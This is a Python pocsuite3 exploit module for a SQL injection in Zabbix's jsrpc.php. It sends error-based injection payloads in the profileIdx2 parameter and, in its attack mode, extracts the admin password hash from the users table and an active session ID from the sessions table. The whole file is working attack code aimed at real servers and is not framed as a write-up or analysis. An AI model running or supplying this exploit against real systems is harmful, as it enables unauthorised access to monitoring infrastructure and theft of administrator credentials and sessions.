# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY,requests
from pocsuite3.lib.core.threads import run_threads
import re


class ZabbixSQLInjectPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 9, 2020'
    createDate = 'Aug 9, 2020'
    name = 'zabbix sqlinject'
    appName = 'zabbix'
    appVersion = 'v1.0.0'
    vulType = 'sqlinject'
    protocol = 'http'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        result = {}
        url = self.url
        if not url.startswith('http'):
            url = 'http://'+url
        try:
            res = requests.get(url+'/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(123),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17')
            if 'd234b70' in res.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            logger.info(e)
        
        return self.parse_output(result)
    def _attack(self):
        result = {}
        url = self.url
        if not url.startswith('http'):
            url = 'http://'+url
        try:
            sql_url = url + "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
            sql_req = requests.get(sql_url, allow_redirects = False, verify=False)
            sql_result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
            sql_results = sql_result_reg.findall(sql_req.text)
            admin_pass = sql_results[0]
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['username'] = 'Admin'
            result['VerifyInfo']['password'] =admin_pass
            session_url = self.url + "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
            session_req = requests.get(session_url, headers = self.headers)
            session_result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
            session_results = session_result_reg.findall(session_req.text)
            session = session_results[0]
            result['VerifyInfo']['session'] =session
            result['extra'] = admin_pass+':'+session
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

register_poc(ZabbixSQLInjectPOC)